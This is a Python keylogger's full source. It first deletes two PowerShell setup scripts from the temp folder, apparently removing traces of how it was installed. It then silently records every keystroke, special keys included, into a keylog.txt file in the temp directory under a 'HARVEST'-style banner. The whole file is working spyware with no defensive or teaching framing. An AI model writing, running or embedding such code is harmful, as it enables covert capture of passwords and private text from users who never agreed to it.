from datetime import datetime
from pynput.keyboard import Listener, Key
import threading
import tempfile
import time
import sys
import os

# declare counter for spaces
counter: int = 0

# declare threading Lock() class
counter_lock = threading.Lock()

# declare main title
title: str = """
██  ██  ▄▄▄  ▄▄▄▄  ▄▄ ▄▄ ▄▄▄▄▄  ▄▄▄▄ ▄▄▄▄▄▄ 
██████ ██▀██ ██▄█▄ ██▄██ ██▄▄  ███▄▄   ██   
██  ██ ██▀██ ██ ██  ▀█▀  ██▄▄▄ ▄▄██▀   ██
"""

# declare main function
def main() -> None:

    # cleanup variables
    TEMP_PATH: str = tempfile.gettempdir()

    FILES_TO_DELETE: list[str] = [
    os.path.join(TEMP_PATH, "python_setup.ps1"),
    os.path.join(TEMP_PATH, "dependencies.ps1"),
    ]

    # cleanup process
    for file in FILES_TO_DELETE:
        try:
            os.remove(file)
            print(f"Successfully deleted: {file}")

        except FileNotFoundError:
            print(f"File not found: {file}")

        except PermissionError:
            print(f"Permission denied: {file}")

        except OSError as error:
            print(f"Unable to delete {file}: {error}")

    # declare *keylog* path
    temp_dir = tempfile.gettempdir()
    keylog_path = os.path.join(temp_dir, "keylog.txt")

    def write_datetime_log():
        formatted_date = datetime.now()

        weekday = formatted_date.strftime("%A")
        date_log = formatted_date.strftime("%x")
        time_log = formatted_date.strftime("%X")

        full_date_log = f" {weekday} | {time_log} | {date_log} "

        # open the file and write date log
        try:
            with open(keylog_path, "a", encoding="utf-8") as document:
                document.write(title)
                document.write("-" * 40)
                document.write("\n"+ full_date_log + "\n")
                document.write("-" * 40 + "\n")

        except Exception as date_log_exception:
            sys.stderr.write(f"There was an error with date log: {date_log_exception}")

    # write date time log
    write_datetime_log()
    
    # main on_press function
    def on_press(key_pressed):
        global counter

        # declare special keys
        special_keys = [Key.backspace, Key.enter, Key.caps_lock, Key.space, Key.delete]

        # open thread with Lock() class
        with counter_lock:
            # write pressed keys in the file
            try:
                with open(keylog_path, "a", encoding="utf-8") as file:
                    # increment counter variable
                    counter = counter + 1
                    # write pressed key
                    if key_pressed in special_keys:
                        file.write(f" [{str(key_pressed.name)}] ")
                    elif hasattr(key_pressed, 'char') and key_pressed.char:
                        file.write(f"{str(key_pressed.char)}")

                    # write some space
                    if counter >= 50:
                        file.write("\n\n")
                        counter = 0
            except Exception as write_key_exception:
                sys.stderr.write(f"There was an error writing keys to the file: {write_key_exception}")
                counter = 0

    # run keylogger
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # starting to run keylogger
    main()
